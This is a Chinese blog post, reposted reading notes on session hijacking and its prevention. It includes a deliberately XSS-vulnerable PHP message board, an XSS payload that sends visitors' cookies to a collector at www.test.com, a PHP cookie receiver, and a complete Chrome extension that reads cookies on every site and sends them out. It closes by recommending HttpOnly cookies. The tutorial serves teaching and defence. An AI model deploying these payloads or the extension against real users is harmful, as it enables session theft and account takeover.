&nbsp;&nbsp;&nbsp;&nbsp;&quot;background&quot;:{ &nbsp;&nbsp;&nbsp;&nbsp;&quot;scripts&quot;:[&quot;jquery-1.8.3.min.js&quot;,&quot;background.js&quot;] &nbsp;&nbsp;&nbsp;&nbsp;} }然后写一个content.js，这个是嵌入到网页的脚本文件，在这个文件里面我们通过js获取客户端的cookie，然后传递给background.js这个文件做处理，这个文件是干嘛的？下一步说明。 var&nbsp;msg&nbsp;=&nbsp;{ cookie:&nbsp;document.cookie, }; //chrome.runtime.sendMessage&nbsp;这个函数向&nbsp;background.js&nbsp;请求数据&nbsp; chrome.runtime.sendMessage(msg);接着我们写一个background.js文件，这个文件是后台脚本，可以简单理解为后台程序，通过这个文件我们跟服务器交互，所以background.js的代码主要实现，从content.js获取用户客户端cookie，然后发送给服务器端的cookie接收器。 //chrome.runtime.onMessage.addListener&nbsp;这个函数监听content.js&nbsp;的请求 chrome.runtime.onMessage.addListener(function(request,&nbsp;sender,&nbsp;sendRequest){&nbsp;&nbsp; var&nbsp;cookie&nbsp;=&nbsp;request.cookie; &nbsp;&nbsp;$.ajax({ &nbsp;&nbsp;&nbsp;&nbsp;method:&#39;get&#39;, &nbsp;&nbsp;&nbsp;&nbsp;url:&#39;http://www.test.com/getCookie.php&#39;, &nbsp;&nbsp;&nbsp;&nbsp;data:&nbsp;&#39;cookie=&#39;+cookie, &nbsp;&nbsp;&nbsp;&nbsp;success:function(data){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(data); &nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;}); })因为我们依赖了jquery，所以把jquery-1.8.3.min.js文件也放到session_hijacking目录下面，最后我们的目录结构应该是这样的： 然后把session_hijacking文件夹拖到chrome的设置页面的扩展程序安装，如图所示： chrome extension准备好了，然后我们要在www.test.com对应的服务端开发一个cookie接收器，文件名叫getCookie.php &lt;?php $cookie&nbsp;=&nbsp;$_GET[&#39;cookie&#39;]; //&nbsp;后面的代码就是把cookie写入数据库 echo&nbsp;&#39;Session劫持成功，服务器端成功保存该用户的Cookie！&#39;.$cookie;最后我们使用csdn做测试（又是csdn，之前我演示CSRF的时候就是用csdn做小白鼠的）。登录csdn，打开chrome extension的背景页，我们可以看到控制台如下信息： 所以呢，chrome extension不要随便乱用了。 总结，上面演示的两种方法其实原理都是一样的，就是使用各种手段通过 js 获取用户客户端的cookie，所以防范这种情况，我们可以通过设置cookie HttpOnly 来防止客户端js获取到cookie。比如drupal的网站就不能通过js获取到对应的SessionID，不信你看下图： 这个是通过浏览器调试工具看到的cookie： 这个是通过document.cookie获取到的cookie： 我们复制这个SessionID我们看到内容如下，使用了HttpOnly： SESS7e15773ea34aa5ed2304263fc16a295e=RWE-6_ADzeBuw0rZT6Ef6GGmgTuSSTrp6XO-c8688gs;&nbsp;expires=Sat,&nbsp;22&nbsp;Apr&nbsp;2017&nbsp;18:52:50&nbsp;GMT;&nbsp;path=/;&nbsp;domain=.test.com;&nbsp;HttpOnly","@type":"BlogPosting","headline":"Session劫持原理，技术实现与防范_Web开发","dateModified":"2020-07-07T00:00:00+08:00","datePublished":"2020-07-07T00:00:00+08:00","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


    <script>
    // 百度统计代码
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ccd4104a124f2218d64c124431d52789";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>


    <script>
    // google analytics
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-163446273-1', 'auto');
      ga('send', 'pageview');

    </script>



</head>


<body>

  <header id="top">
    <div class="wrapper">
        <a href="/" class="brand">TLDSN</a>
        <small>太阳升起时，请重新开始</small>
        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
        <nav id="headerNav">
            <ul>
                <li>
                    
                    <a href="/">
                    
                        <i class="fa fa-home"></i>Home
                    </a>
                </li>

                
                    
                    <li>
                        
                        <a href="/archive/">
                        
                            <i class="fa fa-archive"></i>Archives
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/category/">
                        
                            <i class="fa fa-th-list"></i>Categories
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tag/">
                        
                            <i class="fa fa-tags"></i>Tags
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/collection/">
                        
                            <i class="fa fa-bookmark"></i>Collections
                        </a>
                    </li>
                    
                
                    
                
                    
                    <li>
                        
                        <a href="/todo/">
                        
                            <i class="fa fa-check-square-o"></i>Todo
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/note/">
                        
                            <i class="fa fa-code"></i>Note
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/about/">
                        
                            <i class="fa fa-heart"></i>About
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/authors/">
                        
                            <i class="fa fa-"></i>Staff
                        </a>
                    </li>
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
            </ul>
        </nav>
    </div>
</header>


  <div class="page clearfix" post>
    <div class="left">
        <h1>Session劫持原理，技术实现与防范_Web开发</h1>
        <div class="label">

            <div class="label-card">
                <i class="fa fa-calendar"></i>2020-07-07
            </div>

            <div class="label-card">
                <!-- <i class="fa fa-user"></i>tldsn
                 -->
                
                
                  <a href="/authors/tldsn/"><i class="fa fa-user"></i>tldsn</a>
                
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
            


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#印象笔记导入" title="Category: 印象笔记导入" rel="category">印象笔记导入</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


            </div>

            <div class="label-card">
            
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
  

</span>

            </div>

        </div>
        <hr>
        <article itemscope itemtype="http://schema.org/BlogPosting">
        <html><head></head><body><div class="ennote">
  <div style="--en-clipped-content:simplified">
<div><br></div><div style="font-size: 16px; display:block; min-width: 100%; "> <div style="background-color:transparent;font:inherit;vertical-align:baseline;"><div style="background-color:transparent;font:inherit;vertical-align:baseline;font-family:&quot;PT Serif&quot;;font-size:16px;line-height:1.5em;color:rgb(31, 9, 9);text-align:left;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;z-index:200;padding-left:2em;padding-right:2em;margin-left:auto;margin-right:auto;position:relative;width:36em;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:relative;margin-left:-25px;margin-right:25px;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:relative;padding-top:0px;padding-bottom:9em;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:relative;margin-bottom:0px;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:0px;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:0px;"><h1 style="border:0px none;font:inherit;vertical-align:baseline;font-family:&quot;PT Serif&quot;;text-align:left;font-size:35px;font-weight:normal;line-height:35px;margin-bottom:20px;padding:0px;margin:0px;"> Session劫持原理，技术实现与防范 </h1><div style="padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:relative;height:1em;line-height:1;text-align:center;margin:0px;padding-top:1.5em;padding-bottom:1.5em;margin-bottom:0px;"><div style="padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:absolute;left:-4em;top:50%;z-index:10;width:100%;padding-left:4em;padding-right:4em;height:0.1em;opacity:0.5;margin:0px;background:rgba(0, 0, 0, 0) -webkit-linear-gradient(0deg, rgb(243, 242, 238) 1%, rgb(31, 9, 9) 50%, rgb(243, 242, 238) 99%) repeat scroll 0% 0%;margin-bottom:0px;"><span style="font:inherit;position:absolute;left:-4em;top:50%;z-index:10;width:100%;padding-left:4em;padding-right:4em;height:0.1em;margin:0px;opacity:0.5;background:rgba(0, 0, 0, 0) -webkit-linear-gradient(0deg, rgb(243, 242, 238) 1%, rgb(31, 9, 9) 50%, rgb(243, 242, 238) 99%) repeat scroll 0% 0%;"></span></div></div></div>
                          
                          
    

    
  
    

      
  
  
    <p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">(转载附原文链接：<a href="http://jahng.cn/node/58" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">http://jahng.cn/node/58</a>)</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">今天4月1号( 这篇博客写了两个晚上 )，下午公司没有像往常一样放眼保健操的音乐，而是放了二十分钟张国荣的歌，挺赞的！</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">看了吴翰清的《白帽子讲Web安全》这本书的认证与会话管理这一章的内容，所以写这篇读书笔记。在看懂了书上提到的知识点的基础上，加上一些自己的理解，再通过代码实现，来记录一下自己对 session 安全的理解。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">一般的 Web 登陆认证实现方案是，用户认证登录通过后，在服务端维护在线用户的 Session ，用户下次访问网站的时候，只要告诉服务器使用哪一个session就行，浏览器是通过把当前用户的SessionID告诉服务器，服务器则是通过这个SessionID来识别当前用户的session，因为http是无状态的，所以一般的做法是将SessionID保存在cookie中。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">SessionID是用户登陆之后才有的（假设网站上没有未登录的情况使用session），而服务端又是通过SessionID来认证当前登录用户，所以如果这个SessionID在生命周期内被别人窃取，那么攻击的人就可以直接使用这个SessionID来登录账号，不需要在攻击登录过程（比如暴力破解密码等），这就是Session劫持。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">那么，如何实现Session劫持呢？</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">第一种方法：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">上面提到了，SessionID常常保存在cookie里面，cookie是存在客户端浏览器的，所以我们可以使用XSS来获取用户的SessionID。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">场景：假设有一个网站，这个网站需要一个留言板的功能，登录的用户可以在这个留言板留言，并且所有登录用户都可以浏览留言列表。公司技术老大觉得这个功能太简单了，就决定让一个刚毕业没有任何项目经验的小雏鹰来做这个功能。然后小雏鹰很快完成了。如下代码：</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">&lt;?php
&nbsp;&nbsp;&nbsp;&nbsp;session_start();//假设用户已经登录
&nbsp;&nbsp;&nbsp;&nbsp;if(isset($_GET['message'])){&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//把数据存数据库，没有任何验证，过滤或者转义
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents('message.log',$_GET['message']."\r\n",FILE_APPEND);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;$messageList&nbsp;=&nbsp;explode("\r\n",trim(file_get_contents('message.log'),"\r\n"));
?&gt;
&lt;html&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;head&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;meta&nbsp;charset="utf-8"/&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/head&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;body&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;form&nbsp;action=""&nbsp;method="get"&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;textarea&nbsp;name="message"&nbsp;cols="30"&nbsp;rows="10"&gt;&lt;/textarea&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type="submit"&nbsp;value="留言"&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/form&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;ul&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;foreach($messageList&nbsp;as&nbsp;$message){&nbsp;?&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&lt;?php&nbsp;echo&nbsp;$message;&nbsp;?&gt;&lt;/li&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;}&nbsp;?&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/ul&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/body&gt;
&lt;/html&gt;</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">功能做好了，然后有一个老鸟骇客通过观察发现了这个网站存在XSS漏洞，然后他准备通过这个漏洞来获取这个网站登录用户的SessionID。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">首先简单实现一个Cookie接收器,假设域名接收器的访问链接是：<a href="https://www.test.com/getCookie.php" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">https://www.test.com/getCookie.php</a></p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">&lt;?php
$cookie&nbsp;=&nbsp;$_GET['cookie'];

//&nbsp;后面的代码就是把cookie写入数据库</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">然后他在该网站上注册了个账号，并在留言板留言了，留言的内容如下：</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">&lt;script&gt;window.location.href&nbsp;=&nbsp;'https://www.test.com/getCookie.php?cookie='&nbsp;+&nbsp;document.cookie;&lt;/script&gt;</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">一切都准备妥当了，最后，其他登录用户访问留言列表页的时候，这段XSS Payload被浏览器解析执行，跳转到<a href="https://www.test.com/getCookie.php" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">https://www.test.com/getCookie.php</a>这个链接，并把当前用户的cooie也带过去了。</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">https://www.test.com/getCookie.php?cookie=PHPSESSID=8jbvd2vqqb2ojfnioplatklor2</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">这个时候，攻击者就可以使用这个SessionID登录用户的账号了。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">第二种方法</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">chrome扩展是用来扩展chrome浏览器功能的,比如屏幕截图等。很多用户都会使用各种各样的扩展来简化自己的工作，开发人员（比如我）也可以自己开发自己的扩展用来简化自己的开发工作。但是非技术人员很少开率一个chrome的扩展是否安全。chrome是可以读取用户浏览器的cookie的，我这里实现一下如何使用chrome extension来实现session劫持。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">首先来开发一个chrome extension,功能是用来窃取用户客户端浏览器的cookie。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">创建一个文件夹叫session_hijacking，以下文件都保存在这个文件夹。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">先定义manifest.json文件，这个文件是定义chrome扩展以及一些权限配置。</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"manifest_version":&nbsp;2,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"name":&nbsp;"Session&nbsp;Hijacking&nbsp;Demo",
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"version":&nbsp;"1.0.0.0",
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"content_scripts":[{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"matches":["http://*/*","https://*/*"],
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"js":["jquery-1.8.3.min.js","content.js"]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}],
&nbsp;&nbsp;&nbsp;&nbsp;"background":{
&nbsp;&nbsp;&nbsp;&nbsp;"scripts":["jquery-1.8.3.min.js","background.js"]
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">然后写一个content.js，这个是嵌入到网页的脚本文件，在这个文件里面我们通过js获取客户端的cookie，然后传递给background.js这个文件做处理，这个文件是干嘛的？下一步说明。</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">var&nbsp;msg&nbsp;=&nbsp;{
		cookie:&nbsp;document.cookie,
	};
//chrome.runtime.sendMessage&nbsp;这个函数向&nbsp;background.js&nbsp;请求数据&nbsp;
chrome.runtime.sendMessage(msg);</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">接着我们写一个background.js文件，这个文件是后台脚本，可以简单理解为后台程序，通过这个文件我们跟服务器交互，所以background.js的代码主要实现，从content.js获取用户客户端cookie，然后发送给服务器端的cookie接收器。</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">//chrome.runtime.onMessage.addListener&nbsp;这个函数监听content.js&nbsp;的请求
chrome.runtime.onMessage.addListener(function(request,&nbsp;sender,&nbsp;sendRequest){&nbsp;&nbsp;
var&nbsp;cookie&nbsp;=&nbsp;request.cookie;
&nbsp;&nbsp;$.ajax({
&nbsp;&nbsp;&nbsp;&nbsp;method:'get',
&nbsp;&nbsp;&nbsp;&nbsp;url:'http://www.test.com/getCookie.php',
&nbsp;&nbsp;&nbsp;&nbsp;data:&nbsp;'cookie='+cookie,
&nbsp;&nbsp;&nbsp;&nbsp;success:function(data){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(data);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;});

})</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">因为我们依赖了jquery，所以把jquery-1.8.3.min.js文件也放到session_hijacking目录下面，最后我们的目录结构应该是这样的：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;display:block;text-align:center;margin-top:1em;margin-bottom:1em;"><img title="1491135221333649.gif" width="576" height="315" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;border-color:rgb(31, 9, 9);display:block;max-width:100%;" src="https://app.yinxiang.com/files/common-services/binary-datas/c2VydmljZVR5cGU9MiZzZXJ2aWNlRGF0YT17Im5vdGVHdWlkIjoiMmY2MTllY2QtM2JkOC00NzM2LTk1ZjUtMzAyOTk5OTZhNWExIiwicmVzb3VyY0d1aWQiOiJlZDFlNzYzMS03OGQ2LTQxOTYtOTg3Zi1iNTcxY2Y5NTYzNDIifQ==" data-original-width="761" mime="image/gif" data-original-height="416" id="c8fb897954ca84777ca3be2529db9ab4" class="en-media"></div><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">然后把session_hijacking文件夹拖到chrome的设置页面的扩展程序安装，如图所示：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;display:block;text-align:center;margin-top:1em;margin-bottom:1em;"><img title="1491135284331255.gif" width="576" height="206" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;border-color:rgb(31, 9, 9);display:block;max-width:100%;" src="https://app.yinxiang.com/files/common-services/binary-datas/c2VydmljZVR5cGU9MiZzZXJ2aWNlRGF0YT17Im5vdGVHdWlkIjoiMmY2MTllY2QtM2JkOC00NzM2LTk1ZjUtMzAyOTk5OTZhNWExIiwicmVzb3VyY0d1aWQiOiIwMDYyNWNkNi05ZjgzLTRjYWMtYWU1Ni03NGI2NjY2MDc5YTMifQ==" data-original-width="1193" mime="image/gif" data-original-height="427" id="30ee177da1628424021b3907ae70e7bb" class="en-media"></div><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">chrome extension准备好了，然后我们要在<a href="http://www.test.com/" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">www.test.com</a>对应的服务端开发一个cookie接收器，文件名叫getCookie.php</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">&lt;?php
$cookie&nbsp;=&nbsp;$_GET['cookie'];

//&nbsp;后面的代码就是把cookie写入数据库

echo&nbsp;'Session劫持成功，服务器端成功保存该用户的Cookie！'.$cookie;</pre><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">最后我们使用csdn做测试（又是csdn，之前我演示CSRF的时候就是用csdn做小白鼠的）。登录csdn，打开chrome extension的背景页，我们可以看到控制台如下信息：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;display:block;text-align:center;margin-top:1em;margin-bottom:1em;"><img title="1491135318634894.gif" width="576" height="309" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;border-color:rgb(31, 9, 9);display:block;max-width:100%;" src="https://app.yinxiang.com/files/common-services/binary-datas/c2VydmljZVR5cGU9MiZzZXJ2aWNlRGF0YT17Im5vdGVHdWlkIjoiMmY2MTllY2QtM2JkOC00NzM2LTk1ZjUtMzAyOTk5OTZhNWExIiwicmVzb3VyY0d1aWQiOiJhZDY5MTJkMy05MjJlLTRhYTEtYTA0MS0yNzJkNDc2NzNjZGQifQ==" data-original-width="1013" mime="image/gif" data-original-height="544" id="c6d596db1f6920a56d61e94464bdea19" class="en-media"></div><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">所以呢，chrome extension不要随便乱用了。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">总结，上面演示的两种方法其实原理都是一样的，就是使用各种手段通过 js 获取用户客户端的cookie，所以防范这种情况，我们可以通过设置cookie HttpOnly 来防止客户端js获取到cookie。比如drupal的网站就不能通过js获取到对应的SessionID，不信你看下图： 这个是通过浏览器调试工具看到的cookie：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;display:block;text-align:center;margin-top:1em;margin-bottom:1em;"><img title="1491135371311990.gif" width="576" height="225" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;border-color:rgb(31, 9, 9);display:block;max-width:100%;" src="https://app.yinxiang.com/files/common-services/binary-datas/c2VydmljZVR5cGU9MiZzZXJ2aWNlRGF0YT17Im5vdGVHdWlkIjoiMmY2MTllY2QtM2JkOC00NzM2LTk1ZjUtMzAyOTk5OTZhNWExIiwicmVzb3VyY0d1aWQiOiI0NmYwOWRmNi0wYTE2LTQ4NWItOTIyZS0yZmE5Y2IyNmQ4YjMifQ==" data-original-width="771" mime="image/gif" data-original-height="301" id="a2936aa59ad405af6123d162d9be5b33" class="en-media"></div><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">这个是通过document.cookie获取到的cookie：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;display:block;text-align:center;margin-top:1em;margin-bottom:1em;"><img title="1491135389883764.gif" width="576" height="181" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;border-color:rgb(31, 9, 9);display:block;max-width:100%;" src="https://app.yinxiang.com/files/common-services/binary-datas/c2VydmljZVR5cGU9MiZzZXJ2aWNlRGF0YT17Im5vdGVHdWlkIjoiMmY2MTllY2QtM2JkOC00NzM2LTk1ZjUtMzAyOTk5OTZhNWExIiwicmVzb3VyY0d1aWQiOiI5MGM5MGEyYS1jZTM3LTRhZTItYjNhYS1kNmRkNDU1M2I5MDkifQ==" data-original-width="1337" mime="image/gif" data-original-height="421" id="e11d6acd50058461cfbc1812fb4d0a6b" class="en-media"></div><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">我们复制这个SessionID我们看到内容如下，使用了HttpOnly：</p>
<pre style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;background-color:rgb(243, 242, 238);font-family:Inconsolata;width:auto;font-size:0.875em;line-height:1.71429em;" xml:space="preserve">SESS7e15773ea34aa5ed2304263fc16a295e=RWE-6_ADzeBuw0rZT6Ef6GGmgTuSSTrp6XO-c8688gs;&nbsp;expires=Sat,&nbsp;22&nbsp;Apr&nbsp;2017&nbsp;18:52:50&nbsp;GMT;&nbsp;path=/;&nbsp;domain=.test.com;&nbsp;HttpOnly</pre><br><br></div></div></div></div></div></div></div></div></div></div>
</div>
</div></body></html>
        </article>
        <hr>

        
        
            
            
                
            
        
            
            
                
            
        
            
            
                
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
        
            
            
                
            
        
            
            
        
        

        <div class="post-recent">
    <div class="pre">
        
        <p><strong>上一篇</strong> <a href="/2020/07/03/XSS%E6%94%BB%E5%87%BB_%E7%99%BE%E5%BA%A6%E7%99%BE%E7%A7%91/">XSS攻击_百度百科</a></p>
        
    </div>
    <div class="nex">

        
